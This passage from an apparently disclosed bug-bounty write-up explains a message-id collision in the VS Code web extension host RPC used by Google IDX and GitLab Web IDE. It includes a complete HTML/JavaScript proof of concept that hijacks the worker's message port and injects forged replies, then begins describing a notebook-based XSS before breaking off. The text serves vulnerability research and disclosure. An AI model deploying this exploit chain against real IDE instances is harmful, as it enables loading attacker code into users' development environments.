						<span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nf">_remoteCall</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">myArgs</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">serializeRequestArguments</code> is the serialize helper which converts raw json to serialized rpc message. After continuous iterations of checking the same method I noticed that <code class="language-plaintext highlighter-rouge">this._lastMessageId</code> value remains constant for the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">private</span> <span class="nf">_remoteCall</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">any</span><span class="o">&gt;</span> <span class="p">{</span>
       <span class="p">[...]</span>
       <span class="p">[...]</span>

		<span class="kd">const</span> <span class="nx">serializedRequestArguments</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeRequestArguments</span><span class="p">(</span><span class="nx">args</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">_uriReplacer</span><span class="p">);</span>

		<span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="nx">_lastMessageId</span><span class="p">;</span>
		<span class="kd">const</span> <span class="nx">callId</span> <span class="o">=</span> <span class="nc">String</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">LazyPromise</span><span class="p">();</span>

		<span class="kd">const</span> <span class="nx">disposable</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DisposableStore</span><span class="p">();</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">cancellationToken</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">disposable</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nx">cancellationToken</span><span class="p">.</span><span class="nf">onCancellationRequested</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="kd">const</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeCancel</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`cancel`</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeCancel</span><span class="p">(</span><span class="nx">req</span><span class="p">));</span>
			<span class="p">}));</span>
		<span class="p">}</span>

		<span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">[</span><span class="nx">callId</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PendingRPCReply</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">disposable</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nf">_onWillSendRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">rpcId</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">,</span> <span class="nx">serializedRequestArguments</span><span class="p">,</span> <span class="o">!!</span><span class="nx">cancellationToken</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`request: </span><span class="p">${</span><span class="nf">getStringIdentifierForProxy</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">)}</span><span class="s2">.</span><span class="p">${</span><span class="nx">methodName</span><span class="p">}</span><span class="s2">(`</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
		<span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Based on my understanding this method is responsible for sending the RPC message and also add it to the <code class="language-plaintext highlighter-rouge">this._pendingRPCReplies</code> array the index value is taken from <code class="language-plaintext highlighter-rouge">++this._lastMessageId</code> (here they are using Pre-increment operator) so the <code class="language-plaintext highlighter-rouge">callId</code> value will be +1 whatever was in <code class="language-plaintext highlighter-rouge">this._lastMessageId</code> (remember it as it‚Äôs important)</p>

<p>Still it didn‚Äôt made any sense so I was doing side by side comparison b/w the IDX and Gitlab flow with minified JS (üíÄ)</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181057.png" alt="Pasted image 20240717181057.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181314.png" alt="Pasted image 20240717181314.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181616.png" alt="Pasted image 20240717181616.png" />
<br />
All other values are same other than (those are probably <code class="language-plaintext highlighter-rouge">rpcId</code>)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I 48
K 47
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181818.png" alt="Pasted image 20240717181818.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181947.png" alt="Pasted image 20240717181947.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717182131.png" alt="Pasted image 20240717182131.png" />
<br />
It all came down to this only  <code class="language-plaintext highlighter-rouge">this.w</code> (<code class="language-plaintext highlighter-rouge">this._pendingRPCReplies</code>)</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717192305.png" alt="Pasted image 20240717192305.png" /></p>

<p>Stepping more into it and specifically looking where <code class="language-plaintext highlighter-rouge">this.w</code> related code is</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240720121343.png" alt="Pasted image 20240720121343.png" />
<br />
The above code might look familiar (if not to you it does looks familiar to me as I have looked at it so many times) the counterpart from sourcemap is</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_receiveOneMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">:</span> <span class="nx">VSBuffer</span><span class="p">):</span> <span class="k">void</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_isDisposed</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="kd">const</span> <span class="nx">msgLength</span> <span class="o">=</span> <span class="nx">rawmsg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">;</span>
		<span class="kd">const</span> <span class="nx">buff</span> <span class="o">=</span> <span class="nx">MessageBuffer</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">messageType</span> <span class="o">=</span> <span class="o">&lt;</span><span class="nx">MessageType</span><span class="o">&gt;</span><span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt8</span><span class="p">();</span>
		<span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt32</span><span class="p">();</span>
</code></pre></div></div>

<p>When <code class="language-plaintext highlighter-rouge">messageType</code> is equal to 9 it went to the below switch case</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>			<span class="k">case</span> <span class="nx">MessageType</span><span class="p">.</span><span class="nx">ReplyOKJSON</span><span class="p">:</span> <span class="p">{</span>
				<span class="kd">let</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">deserializeReplyOKJSON</span><span class="p">(</span><span class="nx">buff</span><span class="p">);</span>
				<span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_uriTransformer</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">value</span> <span class="o">=</span> <span class="nf">transformIncomingURIs</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">_uriTransformer</span><span class="p">);</span>
				<span class="p">}</span>
				<span class="k">this</span><span class="p">.</span><span class="nf">_receiveReply</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
</code></pre></div></div>

<p>This calls <code class="language-plaintext highlighter-rouge">_receiveReply</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_receiveReply</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">req</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">value</span><span class="p">:</span> <span class="nx">any</span><span class="p">):</span> <span class="k">void</span> <span class="p">{</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logIncoming</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`receiveReply:`</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">callId</span> <span class="o">=</span> <span class="nc">String</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">.</span><span class="nf">hasOwnProperty</span><span class="p">(</span><span class="nx">callId</span><span class="p">))</span> <span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="kd">const</span> <span class="nx">pendingReply</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">[</span><span class="nx">callId</span><span class="p">];</span>
		<span class="k">delete</span> <span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">[</span><span class="nx">callId</span><span class="p">];</span>

		<span class="nx">pendingReply</span><span class="p">.</span><span class="nf">resolveOk</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>Everything finally made fucking sense when I reached this method, in the <code class="language-plaintext highlighter-rouge">_remoteCall</code> method which is called before the <code class="language-plaintext highlighter-rouge">fetch</code> call is done.  I explained that it sets the <code class="language-plaintext highlighter-rouge">_pendingRPCReplies</code>.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">private</span> <span class="nf">_remoteCall</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">any</span><span class="o">&gt;</span> <span class="p">{</span>
       <span class="p">[...]</span>
       <span class="p">[...]</span>

		<span class="kd">const</span> <span class="nx">serializedRequestArguments</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeRequestArguments</span><span class="p">(</span><span class="nx">args</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">_uriReplacer</span><span class="p">);</span>

		<span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="nx">_lastMessageId</span><span class="p">;</span>
		<span class="kd">const</span> <span class="nx">callId</span> <span class="o">=</span> <span class="nc">String</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">LazyPromise</span><span class="p">();</span>

		<span class="kd">const</span> <span class="nx">disposable</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DisposableStore</span><span class="p">();</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">cancellationToken</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">disposable</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nx">cancellationToken</span><span class="p">.</span><span class="nf">onCancellationRequested</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="kd">const</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeCancel</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`cancel`</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeCancel</span><span class="p">(</span><span class="nx">req</span><span class="p">));</span>
			<span class="p">}));</span>
		<span class="p">}</span>

		<span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">[</span><span class="nx">callId</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PendingRPCReply</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">disposable</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nf">_onWillSendRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">rpcId</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">,</span> <span class="nx">serializedRequestArguments</span><span class="p">,</span> <span class="o">!!</span><span class="nx">cancellationToken</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`request: </span><span class="p">${</span><span class="nf">getStringIdentifierForProxy</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">)}</span><span class="s2">.</span><span class="p">${</span><span class="nx">methodName</span><span class="p">}</span><span class="s2">(`</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
</code></pre></div></div>

<p>The variable naming is also same, <code class="language-plaintext highlighter-rouge">req</code> same as what was used in <code class="language-plaintext highlighter-rouge">_receiveReply</code> and also both the values are also same in case of Gitlab which is <code class="language-plaintext highlighter-rouge">17</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">req</span> <span class="o">=</span> <span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="nx">_lastMessageId</span>
</code></pre></div></div>

<p>So what actually happening here is that when <code class="language-plaintext highlighter-rouge">_remoteCall</code> is invoked for <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> , <code class="language-plaintext highlighter-rouge">this._lastMessageId</code> value is 16 doing a pre increment operation on this stores 17 in the <code class="language-plaintext highlighter-rouge">req</code> variable.</p>

<p>The return value of <code class="language-plaintext highlighter-rouge">PendingRPCReply</code> method is stored at the 17 index of <code class="language-plaintext highlighter-rouge">this._pendingRPCReplies</code>.</p>

<p>Now when the worker message handler forwards this serialized message (which we sent from our attacker controlled page, this happens after the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> is done as described above, here the sequence is important)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\t\x00\x00\x00I\x00\x00\x00O{"$mid":1,"path":"/1.js","scheme":"https","authority":"sudistark.github.io"}'
</code></pre></div></div>

<p>Using <code class="language-plaintext highlighter-rouge">buff.readUInt32()</code> the req value is retrieved which is 17 for the above message and when <code class="language-plaintext highlighter-rouge">_receiveReply</code> gets called <code class="language-plaintext highlighter-rouge">!this._pendingRPCReplies.hasOwnProperty(callId)</code> will be false because there is indeed a property <code class="language-plaintext highlighter-rouge">17</code>.</p>

<p>Next call to <code class="language-plaintext highlighter-rouge">pendingReply.resolveOk(value)</code> sets the value for that rpc method which is then stored in <code class="language-plaintext highlighter-rouge">browserUri</code> and passed to the fetch call :)</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240718220926.png" alt="Pasted image 20240718220926.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729215328.png" alt="Pasted image 20250729215328.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729215505.png" alt="Pasted image 20250729215505.png" />
<br />
Sample poc:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://idx-test-1720965673823.cluster-fu5knmr55rd44vy7k7pxk74ams.cloudworkstations.dev/oss-6a96d5dc452450b1ad67667c4e503a014ef0a908/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=0ab5c6f8-8898-4c17-a4b6-46b33d766d11&amp;parentOrigin=http://127.0.0.1:1338"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="c1">// --- utils ---</span>
    <span class="kd">const</span> <span class="nx">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextDecoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">decode</span> <span class="o">=</span> <span class="nx">decoder</span><span class="p">.</span><span class="nx">decode</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">decoder</span><span class="p">)</span>

    <span class="kd">const</span> <span class="nx">encoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextEncoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">encode</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">encoder</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">str</span><span class="p">).</span><span class="nx">buffer</span>

    <span class="kd">function</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">hex</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nx">length</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nx">hex</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/</span><span class="se">[\d</span><span class="sr">a-f</span><span class="se">]{2}</span><span class="sr">/gi</span><span class="p">).</span><span class="nf">map</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
        <span class="p">})).</span><span class="nx">buffer</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">[...</span><span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)].</span><span class="nf">map</span><span class="p">(</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">)).</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">async</span> <span class="kd">function</span> <span class="nf">fetch_text</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">resp</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="c1">// --- end utils ---</span>

    <span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span> <span class="nf">add_port</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">window</span><span class="p">.</span><span class="nf">removeEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">add_port</span><span class="p">)</span>
            <span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nx">port</span>
            <span class="nx">port</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="nx">port_listener</span>
            <span class="nf">send_map</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">})</span>

    <span class="kd">function</span> <span class="nf">send_map</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Map</span><span class="p">()</span>
        <span class="kd">const</span> <span class="nx">channel</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MessageChannel</span><span class="p">()</span>
        <span class="nx">map</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">gitlab.gitlab-web-ide</span><span class="dl">"</span><span class="p">,</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">)</span>
        <span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">({</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">VSCode.init</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span> <span class="nx">map</span> <span class="p">},</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">])</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">false</span>
    <span class="kd">function</span> <span class="nf">port_listener</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span>
        <span class="c1">// console.log("%crecived: " + decode(rawmsg), "color: gray")</span>

        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">send_called</span> <span class="o">&amp;&amp;</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">02</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// The message is an init message</span>
            <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">true</span>
            <span class="nf">send_everything</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">sleep</span><span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">)</span>
        <span class="p">})</span>
    <span class="p">}</span>
    <span class="k">async</span> <span class="kd">function</span> <span class="nf">send_everything</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">ms</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nf">now</span><span class="p">();</span>
        <span class="kd">const</span> <span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="s2">`pwn-idx.txt?cacheB=</span><span class="p">${</span><span class="nx">ms</span><span class="p">}</span><span class="s2">`</span><span class="p">)).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">)</span>
        <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
        <span class="nx">counter</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for </span><span class="p">(</span><span class="nx">hex</span> <span class="k">of</span> <span class="nx">hex_lines</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span>
            <span class="c1">// console.log("%csent: " + decode(rawmsg), "color: gray")</span>
            <span class="nx">port</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span>
            <span class="nx">counter</span><span class="o">++</span>
            <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250730105114.png" alt="Pasted image 20250730105114.png" />
<br /></p>

<hr />

<h2 id="saga-continues">Saga Continues..</h2>

<p>Well the story doesn‚Äôt ends here and no you don‚Äôt need to wait another week for  remaining part. Will continue from here only.</p>

<p>Even after I did confirmed and managed to build a working POC for Google IDX we still need to make it reproducible in default case as for testing locally I had disabled clickjacking protections which are enforced from the CSP</p>

<p>This is where Sreeram‚Äôs xss comes into play</p>

<h3 id="xss-on-cloudworkstationsgoogleusercontentcom">XSS on <code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code></h3>

<p>Jupyter Notebook comes to the rescue here,</p>

<p>Sample <code class="language-plaintext highlighter-rouge">*.ipynb</code> content that would allow XSS, applications supporting such files would often try to sanitize the markdown content or would render the html in a sandbox origin to avoid any xss issues.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
 </span><span class="nl">"cells"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
   </span><span class="nl">"cell_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"code"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"execution_count"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
   </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"37f81a85"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
   </span><span class="nl">"outputs"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
